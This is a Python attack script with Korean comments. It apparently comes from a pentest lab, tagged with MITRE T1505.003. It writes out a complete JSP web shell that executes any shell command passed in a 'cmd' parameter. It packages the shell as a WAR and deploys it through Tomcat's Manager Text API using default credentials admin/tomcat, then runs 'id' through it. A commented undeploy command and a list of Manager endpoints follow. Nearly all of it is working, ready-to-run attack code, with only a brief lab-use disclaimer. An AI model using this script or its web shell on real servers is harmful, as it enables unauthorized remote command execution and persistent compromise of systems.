# 공격 개요
# - 공격 유형: 웹셸(Web Shell) 업로드 및 원격 명령 실행
# - MITRE ATT&CK: T1505.003 Web Shell
# - 전술(Tactic): Persistence — TA0003
# - 목적: 웹 서버에 악성 JSP 파일을 배포하여 지속적으로 시스템 명령을 실행한다.
# - 대상: Tomcat Manager Text API
# - 동작: JSP 웹셸을 WAR 파일로 압축하고 Manager API를 통해 /shell 경로에 배포한다.
# - 판단: 배포 후 /shell/cmd.jsp?cmd=명령어 주소로 요청하여 명령 실행 결과를 확인한다.
# - 특징: 비정상적인 WAR 업로드, Manager API 요청, 웹 서버 프로세스의 셸 실행 흔적이 남는다.
#
# 주의: 본인이 소유하거나 명시적으로 허가받은 실습 환경에서만 사용한다.

import requests
import zipfile
import io

target = "http://192.168.50.10:8080"
auth = ("admin", "tomcat")

# cmd 파라미터로 전달받은 시스템 명령을 실행하는 JSP 웹셸
jsp = '''<%@ page import="java.io.*"%>
<%
String c = request.getParameter("cmd");

if (c != null) {
    Process p = Runtime.getRuntime().exec(
        new String[]{"/bin/sh", "-c", c}
    );

    BufferedReader b = new BufferedReader(
        new InputStreamReader(p.getInputStream())
    );

    String line;

    while ((line = b.readLine()) != null) {
        out.println(line);
    }
}
%>'''

# JSP 파일을 메모리에서 WAR 형식으로 압축한다.
buf = io.BytesIO()

with zipfile.ZipFile(buf, "w") as z:
    z.writestr("cmd.jsp", jsp)

# Tomcat Manager Text API를 이용해 /shell 경로에 WAR 파일을 배포한다.
r = requests.put(
    f"{target}/manager/text/deploy?path=/shell",
    auth=auth,
    data=buf.getvalue()
)

print("배포:", r.status_code, r.text.strip())

# 배포한 웹셸을 통해 id 명령어를 실행한다.
print(
    "명령 결과:",
    requests.get(f"{target}/shell/cmd.jsp?cmd=id").text
)


# 배포된 /shell 애플리케이션 삭제
# curl -su admin:tomcat \
#   "http://192.168.50.10:8080/manager/text/undeploy?path=/shell"


# Tomcat Manager 경로 참고
# /manager/html              : 브라우저에서 사용하는 관리자 GUI
# /manager/text              : 프로그램과 스크립트에서 사용하는 관리 API
# /manager/text/list         : 배포된 애플리케이션 목록 확인
# /manager/text/deploy       : 애플리케이션 배포
# /manager/text/undeploy     : 배포된 애플리케이션 삭제
# /manager/text/start        : 애플리케이션 시작
# /manager/text/stop         : 애플리케이션 중지
